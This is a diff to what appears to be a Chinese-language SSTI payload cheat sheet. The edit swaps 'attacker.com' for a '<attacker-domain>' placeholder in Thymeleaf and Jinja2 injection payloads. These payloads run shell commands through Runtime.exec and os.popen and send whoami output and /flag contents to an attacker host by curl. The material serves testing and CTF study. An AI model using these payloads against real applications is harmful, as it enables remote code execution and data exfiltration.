@@ -78,7 +78,7 @@ Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：
 *   **Thymeleaf 注入（常用于 Spring Boot 应用）**：
     在 Thymeleaf 渲染控制器的 URL 参数时触发：
     ```text
-    __${T(java.lang.Runtime).getRuntime().exec("curl http://attacker.com")}__::.x
+    __${T(java.lang.Runtime).getRuntime().exec("curl http://<attacker-domain>")}__::.x
     ```
 *   **Velocity 注入**：
     ```text
@@ -206,10 +206,10 @@ Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：
 
 ```python
 # DNS OOB
-{{ lipsum.__globals__['os'].popen('curl $(whoami).attacker.com').read() }}
+{{ lipsum.__globals__['os'].popen('curl $(whoami).<attacker-domain>').read() }}
 
 # HTTP OOB
-{{ config.__class__.__init__.__globals__['os'].popen('curl -d "$(cat /flag)" http://attacker.com/r').read() }}
+{{ config.__class__.__init__.__globals__['os'].popen('curl -d "$(cat /flag)" http://<attacker-domain>/r').read() }}
 ```
 
 ---
